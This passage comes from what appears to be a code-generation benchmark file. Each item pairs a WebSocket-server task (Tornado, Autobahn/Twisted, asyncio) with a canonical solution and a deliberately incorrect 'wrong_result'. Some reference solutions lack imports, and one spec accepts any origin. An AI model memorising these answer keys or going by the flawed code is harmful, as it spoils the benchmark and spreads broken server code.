commit['sha']\n                            if user not in result:\n                                result[user] = {\n                                    'created_issues': [],\n                                    'created_pull_requests': [],\n                                    'merged_commits': []\n                                }\n                            result[user]['merged_commits'].append(commit_hash)\n        \n        return result"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a WebSocket server using Tornado in Python to handle WebSocket connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class initializes and starts a Tornado-based WebSocket server that listens on a specified port. It uses a WebSocketHandler to manage individual WebSocket connections.\n\nAttributes:\n- port: int - The port number on which the WebSocket server will listen.\n- app: tornado.web.Application - The Tornado application instance that routes WebSocket connections.\n- server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the WebSocket application.\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the WebSocketServer with the specified port (default: 8080).\n- start() -> None - Starts the WebSocket server and begins listening for incoming connections.\n\nClass Description: The WebSocketHandler class extends tornado.websocket.WebSocketHandler to handle WebSocket connection events.\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is opened.\n- on_message(msg: str) -> None - Called when a message is received from the WebSocket client.\n- on_close() -> None - Called when the WebSocket connection is closed.\n- check_origin(origin: str) -> bool - Overrides the origin check to allow connections from any origin (returns True).",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        print('opened')\n\n    def on_message(self, msg):\n        print('onmessage', msg)\n\n    def on_close(self):\n        print('closed')\n\n    def check_origin(self, origin):\n        return True\n\nclass WebSocketServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            ('.*', WebSocketHandler)\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "import tornado.web\nimport tornado.websocket\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass WebSocketServer:\n    def __init__(self, port: int = 8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/ws\", WebSocketHandler),\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        print(\"Connection opened\")\n\n    def on_message(self, msg):\n        print(f\"Received message: {msg}\")\n        self.write_message(msg)\n\n    def on_close(self):\n        print(\"Connection closed\")\n\n    def check_origin(self, origin):\n        return True"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a WebSocket server class in Python using autobahn+twisted that can handle WebSocket connections and optionally integrate with a WSGI application.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn and twisted frameworks. It can run standalone for WebSocket communication or be combined with a WSGI application for hybrid HTTP/WebSocket services.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- wsFactory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- wsResource: WebSocketResource - The resource that handles WebSocket connections\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080) -> None - Initializes the WebSocket server with specified host and port\n- start(wsgi_app: callable = None, ws_path: bytes = b'ws') -> None - Starts the server, optionally combining with a WSGI application at the specified path",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource, WSGIRootResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080):\n        self.host = host\n        self.port = port\n        \n        # Create WebSocket factory and protocol\n        self.wsFactory = WebSocketServerFactory(f\"ws://{self.host}:{self.port}\")\n        self.wsFactory.protocol = EchoServerProtocol\n        self.wsResource = WebSocketResource(self.wsFactory)\n\n    def start(self, wsgi_app=None, ws_path=b'ws'):\n        # Create root resource combining WSGI and WebSocket\n        if wsgi_app:\n            wsgiResource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            rootResource = WSGIRootResource(wsgiResource, {ws_path: self.wsResource})\n        else:\n            rootResource = self.wsResource\n\n        # Create site and start server\n        site = Site(rootResource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "import autobahn\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketResource\nfrom twisted.web import resource, server, site\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080):\n        self.host = host\n        self.port = port\n        self.wsFactory = WebSocketServerFactory()\n        self.wsFactory.setResource(WebSocketResource())\n        self.wsResource = WebSocketResource()\n\n    def start(self, wsgi_app=None, ws_path=b'ws'):\n        root = resource.Resource()\n\n        if wsgi_app:\n            wsgi_resource = server.WSGIResource(reactor, site.Site(wsgi_app))\n            root.putChild(b'', wsgi_resource)\n\n        ws_path_str = ws_path.decode('utf-8')\n        root.putChild(ws_path_str, self.wsResource)\n\n        reactor.listenTCP(self.port, server.Site(root))\n        reactor.run()"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that echoes back received messages to clients.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections and echoes back any messages received from clients.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- start() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class:\n- EchoServerProtocol: WebSocketServerProtocol - Handles individual WebSocket connections\n  Methods:\n  - onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received, echoes it back to the client",
    "Canonical_solution": "import sys\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n    def start(self):\n        from twisted.python import log\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from twisted.internet import reactor\nfrom autobahn.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass WebSocketServer:\n    class EchoServerProtocol(WebSocketServerProtocol):\n        def onMessage(self, payload, isBinary):\n            self.sendMessage(payload, isBinary)\n\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(self.EchoServerProtocol)\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, processes messages, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the specified host and port\n- start() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (prints connection info)\n- onOpen() -> None - Called when WebSocket connection is established (prints open message)\n- onMessage(payload: bytes, isBinary: bool) -> None - Handles incoming messages (echoes back received messages)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection closes (prints close reason)",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(f\"Client connected from {request.peer}\")\n\n    def onOpen(self):\n        print(\"Connection opened\")\n\n    def onMessage(self, payload, isBinary):\n        self.sendBytes(payload)\n\n    def onClose(self, wasClean, code, reason):\n        print(f\"Connection closed: {reason}\")\n\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory()\n        self.factory.protocol = MyServerProtocol\n\n    def start(self):\n        reactor.listen(self.port, self.factory)\n        reactor.run()"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a WebSocket echo server using Autobahn and Twisted in Python that can handle multiple WebSocket endpoints with different prefixes for echoing messages.\n\nClass Description: WebSocketEchoServer is a class that implements a WebSocket server capable of handling multiple WebSocket endpoints (paths) with configurable echo prefixes. It uses Twisted's reactor pattern and Autobahn's WebSocket implementation.\n\nAttributes:\n- port: int - The TCP port number on which the WebSocket server will listen (default: 9000)\n- paths: dict - A dictionary mapping WebSocket paths to their corresponding echo prefixes (default: {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"})\n- resources: dict - A dictionary to store the created WebSocket resources for each path\n\nMethods:\n- __init__(port: int = 9000, paths: dict = None) -> None - Initializes the WebSocket echo server with optional port and path configurations\n- create_factory(protocol_class: class, prefix: str) -> WebSocketResource - Creates and configures a WebSocket server factory with the given protocol class and prefix\n- run() -> None - Starts the WebSocket server by creating resources for all paths, setting up the site, and running the reactor loop",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def __init__(self, prefix=\"Echo\"):\n        self.prefix = prefix\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            msg = \"{} - {}\".format(self.prefix, payload.decode('utf8'))\n            print(msg)\n            self.sendMessage(msg.encode('utf8'))\n\nclass WebSocketEchoServer:\n    def __init__(self, port=9000, paths=None):\n        self.port = port\n        self.paths = paths or {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class, prefix):\n        factory = WebSocketServerFactory()\n        factory.protocol = protocol_class\n        factory.prefix = prefix\n        factory.startFactory()\n        return WebSocketResource(factory)\n\n    def run(self):\n        for path, prefix in self.paths.items():\n            protocol = lambda: EchoServerProtocol(prefix)\n            self.resources[path] = self.create_factory(protocol, prefix)\n\n        root = Data(\"\", \"text/plain\")\n        for path, resource in self.resources.items():\n            root.putChild(path.encode('utf8'), resource)\n\n        site = Site(root)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "import autobahn\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketProtocol\nfrom twisted.web.server import Site\nfrom twisted.web.resource import Resource\nfrom twisted.internet import reactor\n\nclass WebSocketEchoServer:\n    def __init__(self, port=9000, paths=None):\n        self.port = port\n        self.paths = paths or {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class, prefix):\n        class CustomProtocol(protocol_class):\n            def __init__(self, *args, **kwargs):\n                self.prefix = prefix\n                super().__init__(*args, **kwargs)\n\n            def onMessage(self, payload, isBinary):\n                if not isBinary:\n                    message = self.prefix + \": \" + payload.decode('utf8')\n                    self.sendMessage(message.encode('utf8'))\n                else:\n                    self.sendMessage(payload)\n        factory = WebSocketServerFactory()\n        factory.protocol = CustomProtocol\n        return WebSocketResource(factory)\n\n    def run(self):\n        for path, prefix in self.paths.items():\n            resource = self.create_factory(WebSocketProtocol, prefix)\n            self.resources[path] = resource\n        site = Resource()\n        for path, resource in self.resources.items():\n            site.putChild(path, resource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket server using Autobahn and Twisted in Python that handles incoming connections and echoes received messages back to clients.\n\nClass Description: The WebSocketServer class creates and manages a WebSocket server that listens for incoming connections, handles WebSocket protocols, and serves static files.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- path: str - The URL path for WebSocket connections (default: \"ws\")\n- factory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- resource: WebSocketResource - The WebSocket resource to handle WebSocket connections\n- root: File - The root filesystem resource for serving static files\n- site: Site - The Twisted web site that serves both WebSocket and static content\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080, path: str = \"ws\") -> None - Initializes the WebSocket server with specified host, port, and path\n- run() -> None - Starts the WebSocket server and begins listening for connections",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.python import log\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request: {}\".format(request))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n\n        self.factory = WebSocketServerFactory(\"ws://{}:{}\".format(host, port))\n        self.factory.protocol = EchoServerProtocol\n\n        self.resource = WebSocketResource(self.factory)\n        self.root = File(\".\")\n        self.root.putChild(path.encode(), self.resource)\n        self.site = Site(self.root)\n\n    def run(self):\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "import sys\nfrom twisted.web import server, resource, file\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketResource, WebSocketProtocol\n\nclass EchoWebSocketProtocol(WebSocketProtocol):\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            self.sendBinary(payload)\n        else:\n            self.sendMessage(payload, isBinary=False)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n        self.factory = WebSocketServerFactory()\n        self.factory.protocol = EchoWebSocketProtocol\n        self.resource = WebSocketResource(self.factory)\n        self.root = file.File(\".\")\n        self.root.putChild(self.path, self.resource)\n        self.site = server.Site(self.root)\n\n    def run(self):\n        from twisted.internet import reactor\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a function that sets up and runs a WebSocket server in a separate thread, allowing for asynchronous communication between clients and the server.\n\nFunction Description: The function `run_websocket_server` initializes and starts a WebSocket server on a specified port. The server runs in a separate thread to avoid blocking the main program. It handles incoming messages by echoing them back to the client. The function returns the event loop and the thread object for potential external control.\n\nInput:  \n- `port` [int] - The port number on which the WebSocket server will listen for incoming connections.\n\nOutput:  \n- `event_loop` [asyncio.AbstractEventLoop] - The event loop associated with the WebSocket server, which can be used to manage or stop the server.  \n- `thd` [threading.Thread] - The thread object running the WebSocket server, which can be used to join or terminate the thread.",
    "Canonical_solution": "import asyncio\nimport websockets\nfrom threading import Thread\n\ndef run_websocket_server(port):\n    event_loop = asyncio.new_event_loop()\n\n    async def empty_server(websocket, path):\n        data = await websocket.recv()\n        await asyncio.sleep(0.02)\n        await websocket.send(data)\n\n    def run_server():\n        asyncio.set_event_loop(event_loop)\n        server = websockets.serve(empty_server, \"127.0.0.1\", port)\n        event_loop.run_until_complete(server)\n        event_loop.run_forever()\n\n    thd = Thread(target=run_server)\n    thd.start()\n    return event_loop, thd",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport threading\n\nasync def echo_handler(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\n\ndef run_websocket_server(port):\n    loop = asyncio.new_event_loop()\n    server_task = loop.create_task(websockets.serve(echo_handler, 'localhost', port))\n    thd = threading.Thread(target=lambda: loop.run_forever())\n    thd.start()\n    return loop, thd"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that handles SQS records, makes HTTP requests, and processes responses in an AWS Lambda environment.\n\nFunction Description: The function processes SQS records asynchronously, makes HTTP GET requests to a specified endpoint using httpx, and returns the HTTP status code. It's designed to work with AWS Lambda Powertools for batch processing.\n\nInput: \n- record: SQSRecord - A single SQS record containing message data\n- (Implicit) client: httpx.AsyncClient - An asynchronous HTTP client created within the function\n\nOutput: \n- int - HTTP status code from the GET request (e.g., 200, 404, etc.)\n- (Through processor) Processed batch response for the Lambda handler",
    "Canonical_solution": "import httpx\nfrom aws_lambda_powertools.utilities.batch import AsyncBatchProcessor, EventType, async_process_partial_response\nfrom aws_lambda_powertools.utilities.data_classes.sqs_event import SQSRecord\nfrom aws_lambda_powertools.utilities.typing import LambdaContext\n\nprocessor = AsyncBatchProcessor(event_type=EventType.SQS)\n\nasync def async_record_handler(record: SQSRecord):\n    async with httpx.AsyncClient() as client:\n        ret = await client.get(\"https://httpbin.org/get\")\n    return ret.status_code\n\ndef lambda_handler(event, context: LambdaContext):\n    return async_process_partial_response(\n        event=event,\n        record_handler=async_record_handler,\n        processor=processor,\n        context=context,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import httpx\nfrom aws_lambda_powertools import Logger, Tracer\nfrom aws_lambda_powertools.utilities.batch import SQSRecord\n\nlogger = Logger()\ntracer = Tracer()\n\nasync def process_record(record: SQSRecord, client: httpx.AsyncClient) -> int:\n    url = record.body\n    async with client.get(url) as response:\n        return response.status_code"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket server interface that manages client connections and facilitates message broadcasting in a synchronous manner using asyncio and threading.\n\nClass Description: SyncWebSocketInterface is a class that provides a synchronous interface to an asynchronous WebSocket server. It manages client connections, handles message broadcasting to all connected clients, and runs the asyncio event loop in a separate thread to maintain responsiveness.\n\nAttributes:\n\nclients: [set] - A set of connected WebSocket clients.\nloop: [asyncio.AbstractEventLoop] - The asyncio event loop used for WebSocket operations.\nthread: [threading.Thread] - The thread running the asyncio event loop.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the WebSocket interface, creates a new event loop, and starts it in a separate thread.\n_run_event_loop: [Name]() -> [None] - Internal method that runs the asyncio event loop in the dedicated thread.\n_run_async: [Name](coroutine) -> [None] - Runs a coroutine in the asyncio event loop from another thread.\n_send_to_all_clients: [Name](clients, msg) -> [None] - Internal async method to send a message to all specified clients.\nregister_client: [Name](websocket) -> [None] - Registers a new WebSocket client to the set of connected clients.\nunregister_client: [Name](websocket) -> [None] - Removes a WebSocket client from the set of connected clients.\ninternal_monologue: [Name](msg) -> [None] - Prints and broadcasts an internal monologue message to all clients.\nassistant_message: [Name](msg) -> [None] - Prints and broadcasts an assistant message to all clients.\nfunction_message: [Name](msg) -> [None] - Prints and broadcasts a function message to all clients.\nclose: [Name]() -> [None] - Stops the event loop and joins the thread, cleaning up resources.",
    "Canonical_solution": "import asyncio\nimport threading\nimport letta.server.ws_api.protocol as protocol\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        try:\n            self.loop.run_forever()\n        finally:\n            self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n            self.loop.close()\n\n    def _run_async(self, coroutine):\n        if not self.loop.is_closed():\n            asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        if clients:\n            await asyncio.gather(*(client.send_text(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_internal_monologue(msg)))\n\n    def assistant_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_assistant_message(msg)))\n\n    def function_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_function_message(msg)))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "class SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        self.loop.run_forever()\n\n    def _run_async(self, coroutine):\n        self.loop.run_until_complete(coroutine)\n\n    async def _send_to_all_clients(self, msg):\n        for client in self.clients:\n            await client.send_text(msg)\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        self._send_to_all_clients(msg)\n\n    def assistant_message(self, msg):\n        print(msg)\n        self._send_to_all_clients(msg)\n\n    def function_message(self, msg):\n        print(msg)\n        self._send_to_all_clients(msg)\n\n    def close(self):\n        self.loop.stop()\n        self.loop.close()\n        self.thread.join()"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echoing back a value, prompting for user input, and throwing an error message. The server runs indefinitely, maintaining persistent connections with clients.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nThe function processes incoming JSON messages with the following structure:\n{\n    \"function\": str - The operation to perform (\"echo\", \"ask\", or \"throw\"),\n    \"args\": list - Arguments for the specified function\n}\n\nThe function sends back JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures or unknown functions",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_connection(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get('function')\n            args = data.get('args', [])\n            if function == 'echo':\n                response = {'return': args[0]}\n                await websocket.send(json.dumps(response))\n            elif function == 'ask':\n                await websocket.send(json.dumps({'prompt': 'Please enter your input'}))\n            elif function == 'throw':\n                await websocket.send(json.dumps({'throw': 'Invalid function'}))\n            else:\n                await websocket.send(json.dumps({'throw': 'Unknown function'}))\n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({'throw': 'Invalid JSON format'}))\n\nstart_server = websockets.serve(handle_connection, 'localhost', 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON data, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (one of 'echo', 'ask', 'throw', or other),\n  \"args\": list (arguments for the specified function),\n  \"return\": any (will be populated in response),\n  \"throw\": any (will be populated in case of errors)\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handler(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get('function')\n            if function == 'echo':\n                response = {'return': data}\n            elif function == 'ask':\n                response = {'return': 'Acknowledged: ask'}\n            elif function == 'throw':\n                response = {'throw': 'Error: thrown'}\n            else:\n                response = {'throw': 'Unknown function'}\n            await websocket.send(json.dumps(response))\n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({'throw': 'Invalid JSON'}))\n\ndef start_websocket_server():\n    asyncio.get_event_loop().run_until_complete(\n        websockets.serve(handler, 'localhost', 8765)\n    )\n    asyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages and sending responses through the WebSocket connection)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": \"echo|ask|throw\",  // Operation to perform\n  \"args\": [...]                // Arguments for the operation\n}",
